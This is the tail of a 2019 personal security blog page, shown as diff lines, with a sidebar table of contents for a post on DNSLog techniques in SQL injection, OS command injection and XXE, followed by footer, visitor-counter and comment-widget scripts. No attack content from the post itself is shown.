class="nav-link" href="#0x01-作用"><span class="nav-number">6.1.</span> <span class="nav-text">0x01 作用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-原理"><span class="nav-number">6.2.</span> <span class="nav-text">0x02 原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03利用"><span class="nav-number">6.3.</span> <span class="nav-text">0x03利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#DNSLog-In-Mysql-Injection"><span class="nav-number">6.3.1.</span> <span class="nav-text">DNSLog In Mysql Injection</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DNSLog-In-OS-Commanding"><span class="nav-number">6.3.2.</span> <span class="nav-text">DNSLog In OS Commanding</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DNSLog-In-XXE"><span class="nav-number">6.3.3.</span> <span class="nav-text">DNSLog In XXE</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#总结-1"><span class="nav-number">6.4.</span> <span class="nav-text">总结</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lyxhh</span>
+
+  
+</div>
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
